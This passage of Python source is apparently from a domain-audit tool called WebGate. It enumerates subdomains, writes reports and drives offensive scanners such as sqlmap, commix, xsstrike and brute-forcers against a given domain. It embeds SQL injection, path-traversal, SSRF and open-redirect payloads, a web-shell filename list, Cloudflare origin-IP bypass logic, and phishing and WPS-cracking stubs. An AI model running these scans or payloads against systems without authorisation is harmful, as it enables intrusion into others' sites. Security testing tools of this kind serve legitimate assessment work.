            "admin", "panel", "cpanel", "whm", "webdisk", "ns1", "ns2",
            "dns", "dns1", "dns2", "mx", "mx1", "mx2", "remote",
            "blog", "shop", "store", "api", "dev", "staging", "test",
            "beta", "demo", "portal", "vpn", "ssh", "git", "svn",
            "jenkins", "ci", "cd", "docs", "wiki", "jira", "confluence",
            "grafana", "monitor", "status", "cdn", "static", "media",
            "images", "img", "assets", "download", "downloads",
            "app", "mobile", "m", "old", "new", "v2", "v3",
            "stage", "uat", "qa", "pre", "prod", "backup",
            "db", "database", "sql", "mysql", "redis", "mongo",
            "elastic", "kibana", "prometheus", "sentry",
            "auth", "sso", "login", "oauth", "id", "accounts",
            "crm", "erp", "hr", "finance", "intranet", "internal",
            "s3", "storage", "files", "cloud", "aws", "gcp", "azure",
        ]

        base = self.domain.split(".")
        if len(base) > 2:
            root = ".".join(base[-2:])
        else:
            root = self.domain

        _lock = threading.Lock()
        def _check_sub(sub):
            if self.cancelled: return
            full = f"{sub}.{root}"
            try:
                ips = socket.gethostbyname(full)
                with _lock:
                    subs_found.append({"subdomain": full, "ip": ips})
                self._log(f"  {full:<32} → {ips}", "FOUND")
            except:
                pass

        with ThreadPoolExecutor(max_workers=30) as pool:
            pool.map(_check_sub, common_subs)

        self._log(f"  Found {len(subs_found)} subdomains", "INFO")
        self.results["subdomains"] = subs_found

    def generate_report(self) -> str:
        self._log("Generating security report...", "STEP"); self._prog(93)
        ts   = datetime.now()
        safe = re.sub(r"[^\w\-.]", "_", self.domain)
        fn   = os.path.join(_REPORTS_DIR, f"audit_{safe}_{ts.strftime('%Y%m%d_%H%M%S')}.txt")
        elapsed = f"{time.time()-self.start_time:.1f}s" if self.start_time else ""
        W = 72; lines = []
        def rule(c="═"): return c * W
        def sec(s): lines.extend(["", rule("─"), f"  {s}", rule("─")])

        lines += [rule(), "  WEBGATE FW3.7 — DOMAIN SECURITY AUDIT REPORT",
                  "  Created by c3less  │  github.com/c3less/webgate", rule("─"),
                  f"  Target    : {self.domain}",
                  f"  Date/Time : {ts.strftime('%Y-%m-%d %H:%M:%S')}",
                  f"  CVE DB    : {get_all_cve_count()} entries"]
        if elapsed: lines.append(f"  Duration  : {elapsed}")
        lines.append(rule())

        sec("1. DNS RESOLUTION")
        r = self.results.get("resolution", {})
        for ip in r.get("ips", []):  lines.append(f"  IPv4          : {ip}")
        for ip in r.get("ipv6", []): lines.append(f"  IPv6          : {ip}")
        lines.append(f"  Reverse DNS   : {r.get('reverse_dns', 'N/A')}")

        sec("2. DNS RECORDS")
        for rtype, recs in self.results.get("dns_records", {}).items():
            if rtype == "error": continue
            for rec in (recs if isinstance(recs, list) else [recs]):
                lines.append(f"  {rtype:<8} : {str(rec)[:62]}")

        sec("3. WHOIS")
        for k, v in self.results.get("whois", {}).items():
            if k != "error":
                lines.append(f"  {k.replace('_',' ').title():<20}: {str(v)[:50]}")

        sec("4. HTTP / HEADERS")
        h = self.results.get("http", {})
        lines += [f"  Status        : {h.get('status_code','N/A')}",
                  f"  Server        : {h.get('server','Not disclosed')}",
                  f"  HTTPS Redir   : {'Yes' if h.get('redirects_to_https') else 'No'}",
                  f"  Sec Score     : {h.get('score',0)}/7", "", "  Security Headers:"]
        for hdr, ok in h.get("security_headers", {}).items():
            lines.append(f"    {'✓' if ok else '✗'}  {hdr}")

        sec("5. SSL/TLS")
        s = self.results.get("ssl", {})
        if s.get("available"):
            for k, lbl in [("version","TLS"),("cipher","Cipher"),("common_name","CN"),
                            ("issuer","Issuer"),("not_after","Expires"),
                            ("days_until_expiry","Days left")]:
                v = s.get(k)
                if v is not None: lines.append(f"  {lbl:<14}: {v}")
        else:
            lines.append(f"  Not available: {s.get('error','unknown')}")

        sec("6. OPEN PORTS + CVE")
        p = self.results.get("ports", {})
        lines.append(f"  Target IP     : {p.get('target_ip','N/A')}")
        for po in p.get("open", []):
            lines.append(f"  {po['port']:5}/tcp  OPEN  {po['service']:<14} {(po.get('banner') or '')[:20]}")
            for cve_id, desc in po.get("cves", [])[:5]:
                lines.append(f"    ⚡ {cve_id}: {desc[:55]}")
        if not p.get("open"):
            lines.append("  No open ports found")

        sec("7. WAF / CDN")
        waf = self.results.get("waf", {})
        lines.append(f"  Detected      : {'Yes' if waf.get('detected') else 'No'}")
        if waf.get("detected"):
            lines.append(f"  WAF           : {waf.get('waf', 'Unknown')}")
            for ind in waf.get("indicators", []):
                lines.append(f"    · {ind}")

        sec("8. SUBDOMAINS")
        subs = self.results.get("subdomains", [])
        if subs:
            for s in subs:
                lines.append(f"  {s['subdomain']:<32} → {s['ip']}")
        else:
            lines.append("  No subdomains enumerated (use 'full' or '--subs' flag)")

        sec("9. RISK SUMMARY")
        risks = self._build_risks()
        if risks:
            for sev, det in risks: lines.append(f"  [{sev:<8}] {det}")
        else:
            lines.append("  [OK] No critical risks found")

        # ── SIMPLIFIED TOOL RESULTS ──────────────────────────────
        sec("10. VULNERABILITY FINDINGS (SIMPLIFIED)")
        ports_data = self.results.get("ports", {})
        sqli_findings = self.results.get("sqli", [])
        xss_findings  = self.results.get("xss",  [])
        sqlmap_dbs    = self.results.get("sqlmap_databases", [])

        lines.append("")
        lines.append("  SQL INJECTION:")
        if sqli_findings or sqlmap_dbs:
            lines.append("  ⚠ FOUND — SQL Injection detected")
            for f in (sqli_findings or [])[:3]:
                lines.append(f"    · {f}")
            if sqlmap_dbs:
                lines.append(f"    · Databases exposed: {', '.join(sqlmap_dbs[:8])}")
        else:
            lines.append("  ✓ None detected")

        lines.append("")
        lines.append("  XSS (Cross-Site Scripting):")
        if xss_findings:
            lines.append("  ⚠ FOUND — XSS vulnerability detected")
            for f in xss_findings[:3]:
                lines.append(f"    · {f}")
        else:
            lines.append("  ✓ None detected")

        lines.append("")
        lines.append("  CRITICAL CVEs (RCE-capable):")
        rce_found = False
        for po in ports_data.get("open", []):
            for cve_id, cve_desc in po.get("cves", []):
                if "RCE" in cve_desc or "9.8" in cve_desc or "10.0" in cve_desc:
                    lines.append(f"  ⚡ {cve_id} on port {po['port']}/{po['service']}")
                    lines.append(f"    → {cve_desc[:70]}")
                    rce_found = True
        if not rce_found:
            lines.append("  ✓ No critical RCE CVEs detected on open ports")

        sec("11. SCAN LOG")
        for ln in self.log_lines: lines.append(f"  {ln}")
        lines += ["", rule(), "  END OF REPORT — WebGate FW3.7 by c3less", rule()]

        # Generate HTML report alongside text
        html_fn = fn.replace(".txt", ".html")
        self._generate_html_report(lines, html_fn)

        try:
            with open(fn, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
            self._log(f"  Saved: {fn}", "FOUND")
        except Exception as e:
            self._log(f"  Save failed: {e}", "ERROR")
        self.results["report_file"] = fn
        self._prog(100)
        return fn

    def _generate_html_report(self, text_lines, html_fn):
        """Generate HTML version of the report."""
        try:
            risk_data = self._build_risks()
            crit = sum(1 for s, _ in risk_data if s == "CRITICAL")
            high = sum(1 for s, _ in risk_data if s == "HIGH")
            med  = sum(1 for s, _ in risk_data if s == "MEDIUM")
            ports = self.results.get("ports", {})
            open_count = len(ports.get("open", []))
            waf = self.results.get("waf", {})
            ssl_info = self.results.get("ssl", {})
            http_info = self.results.get("http", {})
            score = http_info.get("score", 0)

            # Build port rows
            port_rows = ""
            for po in ports.get("open", []):
                cve_count = len(po.get("cves", []))
                cve_badge = f'<span style="color:#ff4757">{cve_count} CVE</span>' if cve_count else ""
                port_rows += f"<tr><td>{po['port']}</td><td>{po['service']}</td>"
                port_rows += f"<td>{(po.get('banner','') or '')[:40]}</td><td>{cve_badge}</td></tr>\n"

            # Build risk rows
            risk_rows = ""
            for sev, det in risk_data:
                color = {"CRITICAL":"#ff4757","HIGH":"#ff6b6b","MEDIUM":"#ffa502","LOW":"#2ed573"}.get(sev,"#ccc")
                risk_rows += f'<tr><td><span style="color:{color};font-weight:bold">{sev}</span></td>'
                risk_rows += f'<td>{det}</td></tr>\n'

            html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WebGate Report — {self.domain}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Courier New',monospace;background:#0a0d14;color:#c8d4e8;padding:20px}}
.container{{max-width:900px;margin:0 auto}}
h1{{color:#4a9eff;font-size:24px;margin-bottom:4px}}
h2{{color:#4a9eff;font-size:16px;margin:20px 0 8px;border-bottom:1px solid #1e2a48;padding-bottom:4px}}
.subtitle{{color:#8898b8;font-size:12px;margin-bottom:16px}}
.card{{background:#0f1220;border:1px solid #1e2a48;border-radius:6px;padding:16px;margin:10px 0}}
.stats{{display:flex;gap:12px;flex-wrap:wrap;margin:12px 0}}
.stat{{background:#141828;border:1px solid #1e2a48;border-radius:4px;padding:10px 16px;text-align:center;flex:1;min-width:100px}}
.stat .val{{font-size:22px;font-weight:bold}}
.stat .lbl{{color:#8898b8;font-size:10px;margin-top:2px}}
.crit .val{{color:#ff4757}} .high .val{{color:#ff6b6b}} .med .val{{color:#ffa502}} .ok .val{{color:#2ed573}}
table{{width:100%;border-collapse:collapse;margin:8px 0}}
th,td{{text-align:left;padding:6px 10px;border-bottom:1px solid #1e2a48;font-size:13px}}
th{{color:#4a9eff;font-size:11px;text-transform:uppercase}}
.footer{{color:#3a4868;font-size:11px;text-align:center;margin-top:30px;padding-top:10px;border-top:1px solid #1e2a48}}
.badge{{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;font-weight:bold}}
.badge-waf{{background:#ff650033;color:#ff6500}}
.badge-ok{{background:#2ed57333;color:#2ed573}}
</style>
</head>
<body>
<div class="container">
<h1>WebGate FW3.7</h1>
<div class="subtitle">Domain Security Audit Report &middot; {self.domain} &middot; {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>

<div class="stats">
  <div class="stat crit"><div class="val">{crit}</div><div class="lbl">CRITICAL</div></div>
  <div class="stat high"><div class="val">{high}</div><div class="lbl">HIGH</div></div>
  <div class="stat med"><div class="val">{med}</div><div class="lbl">MEDIUM</div></div>
  <div class="stat"><div class="val">{open_count}</div><div class="lbl">OPEN PORTS</div></div>
  <div class="stat {'ok' if score >= 5 else 'med' if score >= 3 else 'high'}"><div class="val">{score}/7</div><div class="lbl">SEC HEADERS</div></div>
  <div class="stat"><div class="val">{'<span class="badge badge-waf">'+waf.get("waf","")+'</span>' if waf.get("detected") else '<span class="badge badge-ok">None</span>'}</div><div class="lbl">WAF</div></div>
</div>

<h2>Open Ports</h2>
<div class="card">
<table>
<tr><th>Port</th><th>Service</th><th>Banner</th><th>CVEs</th></tr>
{port_rows if port_rows else '<tr><td colspan="4">No open ports</td></tr>'}
</table>
</div>

<h2>Risk Summary</h2>
<div class="card">
<table>
<tr><th>Severity</th><th>Details</th></tr>
{risk_rows if risk_rows else '<tr><td colspan="2">No risks found</td></tr>'}
</table>
</div>

<h2>SSL/TLS</h2>
<div class="card">
<table>
<tr><td>Available</td><td>{'Yes' if ssl_info.get('available') else 'No'}</td></tr>
<tr><td>Version</td><td>{ssl_info.get('version','N/A')}</td></tr>
<tr><td>Cipher</td><td>{ssl_info.get('cipher','N/A')}</td></tr>
<tr><td>Issuer</td><td>{ssl_info.get('issuer','N/A')}</td></tr>
<tr><td>Expires</td><td>{ssl_info.get('not_after','N/A')}</td></tr>
<tr><td>Self-signed</td><td>{'Yes' if ssl_info.get('self_signed') else 'No'}</td></tr>
</table>
</div>

<h2>HTTP Info</h2>
<div class="card">
<table>
<tr><td>Status</td><td>{http_info.get('status_code','N/A')}</td></tr>
<tr><td>Server</td><td>{http_info.get('server','Not disclosed')}</td></tr>
<tr><td>HTTPS Redirect</td><td>{'Yes' if http_info.get('redirects_to_https') else 'No'}</td></tr>
</table>
</div>

<div class="footer">WebGate FW3.7 &middot; by c3less &middot; github.com/c3less/webgate</div>
</div>
</body>
</html>"""
            with open(html_fn, "w", encoding="utf-8") as f:
                f.write(html)
            self._log(f"  HTML report: {html_fn}", "FOUND")
        except Exception as e:
            self._log(f"  HTML report failed: {e}", "WARN")

    def _build_risks(self) -> list:
        risks = []; s = self.results.get("ssl", {})
        if not s.get("available"):
            risks.append(("HIGH", "No HTTPS on port 443"))
        if s.get("self_signed"):
            risks.append(("HIGH", "Self-signed certificate"))
        d = s.get("days_until_expiry")
        if d is not None:
            if d < 0:   risks.append(("CRITICAL", f"SSL EXPIRED {abs(d)}d ago"))
            elif d < 15: risks.append(("HIGH", f"SSL expires in {d} days"))
            elif d < 30: risks.append(("MEDIUM", f"SSL expires in {d} days"))
        sc = self.results.get("http", {}).get("score", 0)
        if sc < 3:  risks.append(("HIGH",   f"Poor security headers ({sc}/7)"))
        elif sc < 5: risks.append(("MEDIUM", f"Incomplete security headers ({sc}/7)"))
        if not self.results.get("http", {}).get("redirects_to_https"):
            risks.append(("MEDIUM", "HTTP→HTTPS redirect not enforced"))
        danger = {"Telnet", "FTP", "RDP", "SMB"}
        dbs    = {"MySQL", "PostgreSQL", "MongoDB", "Redis", "Memcached", "Elasticsearch"}
        for po in self.results.get("ports", {}).get("open", []):
            if po["service"] in danger:
                risks.append(("HIGH",     f"Dangerous port: {po['port']}/{po['service']}"))
            elif po["service"] in dbs:
                risks.append(("HIGH",     f"Database exposed: {po['port']}/{po['service']}"))
            if po.get("cves"):
                risks.append(("CRITICAL", f"{len(po['cves'])} CVE(s) for {po['service']} on :{po['port']}"))
        return risks

    def run(self, include_subs=False) -> str | None:
        self.start_time = time.time()
        self._log(f"Starting audit: {self.domain}", "INFO")
        self._log("─" * 52, "INFO")
        steps = [
            self.resolve_dns, self.check_dns_records, self.get_whois,
            self.analyze_http_headers, self.detect_waf, self.check_ssl,
            self.scan_ports, self.generate_report,
        ]
        if include_subs:
            steps.insert(7, self.enumerate_subdomains)
        for step in steps:
            if self.cancelled:
                self._log("Cancelled.", "WARN"); return None
            try:
                step()
            except Exception as e:
                self._log(f"Step error: {e}", "ERROR")
        elapsed = time.time() - self.start_time
        self._log("─" * 52, "INFO")
        self._log(f"SCAN COMPLETE  [{elapsed:.1f}s]", "SUCCESS")
        return self.results.get("report_file")


# ═══════════════════════════════════════════════════════════════
# DEEP SCANNER — 30 tools
# ═══════════════════════════════════════════════════════════════
class DeepScanner:
    def __init__(self, domain: str, log_cb=None, prog_cb=None, tools=None):
        self.domain    = domain
        self.log_cb    = log_cb  or print
        self.prog_cb   = prog_cb or (lambda v: None)
        self.results   = {}
        self.cancelled = False
        self.base_url  = f"http://{domain}"
        self.tools     = tools or SETTINGS.get("deep_tools", {})

    def _log(self, m, l="INFO"): self.log_cb(m, l)
    def _prog(self, v):          self.prog_cb(min(100, int(v)))
    def _enabled(self, key):     return self.tools.get(key, False)

    def _run_ext(self, key: str, cmd: list, timeout=120) -> str:
        name = TOOL_CATALOG.get(key, {}).get("label", key)
        self._log(f"Running {name}…", "STEP")
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            out = (res.stdout + res.stderr).strip()
            self.results[key] = out
            lines = out.count('\n') + 1
            self._log(f"{name} complete ({lines} lines output).", "FOUND")
            return out
        except FileNotFoundError:
            self._log(f"{name} not installed — skipping.", "WARN")
        except subprocess.TimeoutExpired:
            self._log(f"{name} timed out.", "WARN")
        except Exception as e:
            self._log(f"{name} error: {e}", "ERROR")
        return ""

    # ── External tools ──────────────────────────────────────────
    def run_nmap(self):
        if not self._enabled("nmap"): return
        self._run_ext("nmap",
            ["nmap", "-sV", "-sC", "--open", "-p", "1-10000", self.domain],
            timeout=180)
        self._prog(12)

    def run_wpscan(self):
        if not self._enabled("wpscan"): return
        self._run_ext("wpscan",
            ["wpscan", "--url", f"https://{self.domain}",
             "--no-update", "--format", "cli-no-colour",
             "--enumerate", "p,t,u", "--plugins-detection", "aggressive"],
            timeout=180)
        self._prog(22)

    def run_sqlmap(self):
        if not self._enabled("sqlmap"): return
        self._run_ext("sqlmap",
            ["sqlmap", "-u", f"http://{self.domain}",
             "--crawl=2", "--level=2", "--risk=2", "--batch",
             "--forms", "--random-agent"],
            timeout=240)
        self._prog(32)

    def run_cmseek(self):
        if not self._enabled("cmseek"): return
        self._run_ext("cmseek",
            ["cmseek", "-u", f"http://{self.domain}", "--batch"],
            timeout=120)
        self._prog(38)

    def run_xsstrike(self):
        if not self._enabled("xsstrike"): return
        self._run_ext("xsstrike",
            ["xsstrike", "-u", f"http://{self.domain}",
             "--crawl", "--blind"],
            timeout=120)
        self._prog(44)

    def run_gobuster(self):
        if not self._enabled("gobuster"): return
        self._run_ext("gobuster",
            ["gobuster", "dir", "-u", f"http://{self.domain}",
             "-w", "/usr/share/wordlists/dirb/common.txt",
             "-t", "50", "-q", "--no-error"],
            timeout=120)
        self._prog(50)

    def run_commix(self):
        if not self._enabled("commix"): return
        self._run_ext("commix",
            ["commix", "--url", f"http://{self.domain}",
             "--batch", "--crawl=2"],
            timeout=180)
        self._prog(55)

    def run_droopescan(self):
        if not self._enabled("droopescan"): return
        self._run_ext("droopescan",
            ["droopescan", "scan", "drupal", "-u", f"http://{self.domain}"],
            timeout=120)
        self._prog(58)

    def run_brutex(self):
        if not self._enabled("brutex"): return
        self._run_ext("brutex",
            ["brutex", self.domain],
            timeout=300)
        self._prog(62)

    def run_arachni(self):
        if not self._enabled("arachni"): return
        self._run_ext("arachni",
            ["arachni", f"http://{self.domain}", "--checks=*",
             "--scope-include-subdomains"],
            timeout=300)
        self._prog(66)

    def run_sslstrip(self):
        if not self._enabled("sslstrip"): return
        self._log("SSLstrip requires active MITM position — logging info only.", "WARN")
        self.results["sslstrip"] = "SSLstrip: passive mode — MITM not active"
        self._prog(68)

    def run_setoolkit(self):
        if not self._enabled("setoolkit"): return
        self._log("SET (Social Engineering Toolkit) requires interactive mode.", "WARN")
        self.results["setoolkit"] = "SET: requires interactive terminal"
        self._prog(70)

    def run_weeman(self):
        if not self._enabled("weeman"): return
        self._log("Weeman phishing framework — interactive mode required.", "WARN")
        self.results["weeman"] = "Weeman: requires interactive terminal"
        self._prog(72)

    def run_reaver(self):
        if not self._enabled("reaver"): return
        self._log("Reaver WPS attack — requires wireless interface.", "WARN")
        self.results["reaver"] = "Reaver: requires wireless adapter in monitor mode"
        self._prog(73)

    def run_pixiewps(self):
        if not self._enabled("pixiewps"): return
        self._log("Pixiewps WPS pixie-dust — requires wireless interface.", "WARN")
        self.results["pixiewps"] = "Pixiewps: requires wireless adapter"
        self._prog(74)

    def run_cupp(self):
        if not self._enabled("cupp"): return
        self._run_ext("cupp",
            ["cupp", "-w", self.domain.split(".")[0]],
            timeout=30)
        self._prog(75)

    # ── Internal scanners ───────────────────────────────────────
    def _http_get(self, path: str, timeout=8) -> tuple:
        for proto in ("https", "http"):
            try:
                url = f"{proto}://{self.domain}/{path.lstrip('/')}"
                req = Request(url, headers={"User-Agent": "Mozilla/5.0 (WebGate/3.0)"})
                with urlopen(req, timeout=timeout) as r:
                    return r.status, r.read(4096).decode("utf-8", errors="ignore")
            except HTTPError as e:
                return e.code, ""
            except: pass
        return 0, ""

    def run_wordpress_scan(self):
        if not self._enabled("wordpress_scan"): return
        self._log("WordPress path scan…", "STEP")
        paths = ["wp-login.php", "wp-admin/", "wp-json/wp/v2/users",
                 "xmlrpc.php", "wp-content/uploads/", "readme.html",
                 "license.txt", "wp-config.php.bak"]
        found = []
        for p in paths:
            if self.cancelled: break
            code, body = self._http_get(p)
            if code in (200, 301, 302):
                found.append(f"  {code}  /{p}")
                self._log(f"  [WP] {code}  /{p}", "FOUND")
        if "wp-json/wp/v2/users" in str(found):
            self._log("  [WP] User enumeration via REST API — CRITICAL", "ERROR")
        self.results["wordpress_scan"] = "\n".join(found) or "No WP paths found"
        self._prog(78)

    def run_wp_plugins(self):
        if not self._enabled("wp_plugins"): return
        self._log("Scanning WordPress plugins…", "STEP")
        plugins = [
            "contact-form-7", "yoast-seo", "woocommerce", "wordfence",
            "elementor", "all-in-one-seo-pack", "wp-super-cache",
            "jetpack", "wpforms-lite", "classic-editor",
            "revslider", "gravityforms", "ninja-forms", "visual-composer",
        ]
        found = []
        for plugin in plugins:
            if self.cancelled: break
            code, _ = self._http_get(f"wp-content/plugins/{plugin}/")
            if code in (200, 403):
                found.append(plugin)
                self._log(f"  [Plugin] {plugin} — HTTP {code}", "FOUND")
                cves = query_cve(plugin)
                for cid, cdesc in cves[:2]:
                    self._log(f"    ⚡ {cid}: {cdesc[:55]}", "WARN")
        self.results["wp_plugins"] = "\n".join(found) or "No plugins detected"
        self._prog(80)

    def run_wp_exploit(self):
        if not self._enabled("wp_exploit"): return
        self._log("WordPress exploit surface check…", "STEP")
        issues = []
        code, body = self._http_get("xmlrpc.php")
        if code in (200, 405):
            issues.append("XML-RPC enabled — brute force possible")
            self._log("  [WP-Exploit] XML-RPC enabled (CVE-2020-28032 surface)", "WARN")
        code, body = self._http_get("wp-json/wp/v2/users")
        if code == 200 and '"id"' in body:
            issues.append("User enumeration via REST API")
            self._log("  [WP-Exploit] User list exposed via REST API!", "ERROR")
        code, _ = self._http_get("?author=1")
        if code in (301, 302):
            issues.append("Author enumeration via ?author=N")
            self._log("  [WP-Exploit] Author enumeration possible", "WARN")
        self.results["wp_exploit"] = "\n".join(issues) or "No obvious WP exploits found"
        self._prog(82)

    def run_gravityforms(self):
        if not self._enabled("gravityforms"): return
        self._log("Gravity Forms scanner…", "STEP")
        code, body = self._http_get("wp-content/plugins/gravityforms/")
        if code in (200, 403):
            self._log("  [GravityForms] Plugin present!", "FOUND")
            cves = query_cve("gravityforms")
            for cid, cdesc in cves[:3]:
                self._log(f"    ⚡ {cid}: {cdesc[:55]}", "WARN")
            self.results["gravityforms"] = "GravityForms detected"
        else:
            self.results["gravityforms"] = "GravityForms not detected"
        self._prog(83)

    def run_upload_check(self):
        if not self._enabled("upload_check"): return
        self._log("File upload surface check…", "STEP")
        upload_paths = [
            "upload.php", "uploader.php", "file-upload.php",
            "wp-content/uploads/", "uploads/", "files/",
            "admin/upload.php", "data/upload/",
        ]
        found = []
        for p in upload_paths:
            if self.cancelled: break
            code, body = self._http_get(p)
            if code in (200, 403):
                found.append(p)
                self._log(f"  [Upload] {code}  /{p}", "FOUND")
        self.results["upload_check"] = "\n".join(found) or "No upload paths found"
        self._prog(84)

    def run_sqli_scan(self):
        if not self._enabled("sqli_scan"): return
        self._log("Quick SQLi surface scan…", "STEP")
        payloads = ["'", "''", "' OR '1'='1", "1 AND 1=1", "1; SELECT 1--"]
        errors   = ["sql syntax", "mysql_fetch", "ORA-", "syntax error",
                    "unclosed quotation", "pg_query", "sqlite_"]
        findings = []
        for pl in payloads:
            if self.cancelled: break
            code, body = self._http_get(f"?id={pl}", timeout=6)
            low = body.lower()
            for err in errors:
                if err.lower() in low:
                    findings.append(f"Payload '{pl}' triggered: {err}")
                    self._log(f"  [SQLi] Error triggered by payload: {pl}", "ERROR")
                    break
        self.results["sqli_scan"] = "\n".join(findings) or "No SQLi errors detected"
        self._prog(86)

    def run_shell_finder(self):
        if not self._enabled("shell_finder"): return
        self._log("Shell and backdoor finder…", "STEP")
        shells = [
            "shell.php", "cmd.php", "c99.php", "r57.php", "wso.php",
            "b374k.php", "weevely.php", "alfa.php", "mini.php",
            "indoxploit.php", "priv8.php", "bypass.php", "test.php",
            "info.php", "phpinfo.php", "admin.php", "config.php.bak",
        ]
        found = []
        for s in shells:
            if self.cancelled: break
            for prefix in ["", "uploads/", "wp-content/uploads/", "files/"]:
                code, body = self._http_get(f"{prefix}{s}", timeout=5)
                if code == 200 and len(body) > 20:
                    path = f"/{prefix}{s}"
                    found.append(path)
                    self._log(f"  [SHELL] {code}  {path} ({len(body)}b)", "ERROR")
                    break
        self.results["shell_finder"] = "\n".join(found) or "No shells found"
        self._prog(87)

    def run_joomla_rce(self):
        if not self._enabled("joomla_rce"): return
        self._log("Joomla RCE surface check…", "STEP")
        code, body = self._http_get("administrator/index.php")
        if code == 200 and "joomla" in body.lower():
            self._log("  [Joomla] Admin panel detected!", "FOUND")
            self._log("  [Joomla] Check CVE-2015-8562, CVE-2023-23752", "WARN")
            cves = query_cve("joomla")
            for cid, cdesc in cves[:3]:
                self._log(f"    ⚡ {cid}: {cdesc[:55]}", "WARN")
            self.results["joomla_rce"] = "Joomla admin detected — CVE surface active"
        else:
            self.results["joomla_rce"] = "Joomla not detected"
        self._prog(88)

    def run_vbulletin_rce(self):
        if not self._enabled("vbulletin_rce"): return
        self._log("vBulletin RCE surface check…", "STEP")
        code, body = self._http_get("admincp/index.php")
        if code in (200, 302):
            self._log("  [vBulletin] Admin panel detected!", "FOUND")
            cves = query_cve("vbulletin")
            for cid, cdesc in cves[:3]:
                self._log(f"    ⚡ {cid}: {cdesc[:55]}", "WARN")
            self.results["vbulletin_rce"] = "vBulletin admin detected"
        else:
            self.results["vbulletin_rce"] = "vBulletin not detected"
        self._prog(89)

    def run_bypass_cf(self):
        if not self._enabled("bypass_cf"): return
        self._log("Cloudflare bypass detection…", "STEP")
        info = []
        try:
            ip = socket.gethostbyname(self.domain)
            cf_ranges = ["103.21.", "103.22.", "103.31.", "104.16.", "104.17.",
                         "104.18.", "104.19.", "108.162.", "141.101.", "162.158.",
                         "172.64.", "172.65.", "172.66.", "172.67.", "173.245.",
                         "188.114.", "188.166.", "190.93.", "197.234.", "198.41.",
                         "199.27."]
            is_cf = any(ip.startswith(r) for r in cf_ranges)
            if is_cf:
                self._log(f"  [CF] IP {ip} is behind Cloudflare", "FOUND")
                info.append(f"Cloudflare IP: {ip}")
                # Try to find real IP via DNS history hints
                try:
                    subdomains = ["direct", "mail", "ftp", "cpanel", "webmail",
                                  "smtp", "pop", "ssh", "origin", "www2"]
                    for sub in subdomains:
                        try:
                            real = socket.gethostbyname(f"{sub}.{self.domain}")
                            if not any(real.startswith(r) for r in cf_ranges):
                                self._log(f"  [CF-Bypass] Real IP found: {sub}.{self.domain} = {real}", "ERROR")
                                info.append(f"Real IP candidate: {real} (via {sub})")
                        except: pass
                except: pass
            else:
                self._log(f"  [CF] Not behind Cloudflare (IP: {ip})", "INFO")
        except Exception as e:
            self._log(f"  [CF] Error: {e}", "ERROR")
        self.results["bypass_cf"] = "\n".join(info) or "No Cloudflare bypass found"
        self._prog(90)

    def run_poet(self):
        if not self._enabled("poet"): return
        self._log("POET (Parameter/endpoint) enumeration…", "STEP")
        params = ["?debug=1", "?test=1", "?admin=1", "?cmd=id", "?id=1",
                  "?page=../../etc/passwd", "?file=../etc/passwd",
                  "?include=php://input", "?url=http://169.254.169.254/",
                  "?redirect=http://evil.com", "?callback=alert(1)"]
        findings = []
        for p in params:
            if self.cancelled: break
            code, body = self._http_get(p, timeout=6)
            if code == 200 and any(x in body for x in ["root:x:", "uid=", "HTTP/1."]):
                findings.append(f"Param {p} — suspicious response!")
                self._log(f"  [POET] Suspicious response to {p}", "ERROR")
        self.results["poet"] = "\n".join(findings) or "No POET findings"
        self._prog(91)

    def run_inurlbr(self):
        if not self._enabled("inurlbr"): return
        self._log("Inurlbr dork-based recon…", "STEP")
        dorks = [
            f"site:{self.domain} inurl:admin",
            f"site:{self.domain} inurl:login",
            f"site:{self.domain} filetype:sql",
            f"site:{self.domain} filetype:env",
            f"site:{self.domain} intitle:index.of",
        ]
        self._log("  [Inurlbr] Dorks generated (manual Google search required):", "INFO")
        for d in dorks:
            self._log(f"  {d}", "FOUND")
        self.results["inurlbr"] = "\n".join(dorks)
        self._prog(92)

    def run_port_scan_deep(self):
        if not self._enabled("port_scan_deep"): return
        self._log("Extended port scan (top 2000)…", "STEP")
        extra_ports = [8000, 8001, 8002, 8008, 8009, 8081, 8082, 8083,
                       8090, 8161, 8180, 8280, 8888, 9000, 9001, 9090,
                       9200, 9300, 9418, 10000, 10443, 15672, 16000,
                       25565, 27015, 49152, 50000]
        try:
            ip = socket.gethostbyname(self.domain)
        except:
            ip = self.domain
        open_extra = []
        for port in extra_ports:
            if self.cancelled: break
            try:
                s = socket.socket()
                s.settimeout(1.0)
                if s.connect_ex((ip, port)) == 0:
                    open_extra.append(port)
                    self._log(f"  [PortDeep] {port}/tcp OPEN", "FOUND")
                s.close()
            except: pass
        self.results["port_scan_deep"] = str(open_extra)
        self._prog(93)

    def run_ssl_audit(self):
        if not self._enabled("ssl_audit"): return
        self._log("Full SSL/TLS audit…", "STEP")
        findings = []
        weak_ciphers = ["RC4", "DES", "3DES", "EXPORT", "NULL", "anon"]
        try:
            for proto in [ssl.PROTOCOL_TLS_CLIENT]:
                ctx = ssl.SSLContext(proto)
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                with socket.create_connection((self.domain, 443), timeout=8) as raw:
                    with ctx.wrap_socket(raw) as ss:
                        cipher = ss.cipher()
                        if cipher:
                            name = cipher[0]
                            for w in weak_ciphers:
                                if w in name:
                                    findings.append(f"Weak cipher: {name}")
                                    self._log(f"  [SSL] WEAK CIPHER: {name}", "ERROR")
                                    break
                            else:
                                self._log(f"  [SSL] Cipher: {name} — OK", "INFO")
        except Exception as e:
            self._log(f"  [SSL] Audit error: {e}", "WARN")
        cves = query_cve("ssl")
        for cid, cdesc in cves[:3]:
            self._log(f"    ⚡ {cid}: {cdesc[:55]}", "WARN")
        self.results["ssl_audit"] = "\n".join(findings) or "SSL audit OK"
        self._prog(95)

    def run(self):
        self._log(f"Deep scan started: {self.domain}", "INFO")
        self._log(f"Tools enabled: {sum(1 for v in self.tools.values() if v)}", "INFO")

        steps = [
            self.run_nmap, self.run_wpscan, self.run_sqlmap,
            self.run_cmseek, self.run_xsstrike, self.run_gobuster,
            self.run_commix, self.run_droopescan, self.run_brutex,
            self.run_arachni, self.run_sslstrip, self.run_setoolkit,
            self.run_weeman, self.run_reaver, self.run_pixiewps,
            self.run_cupp,
            # Internal
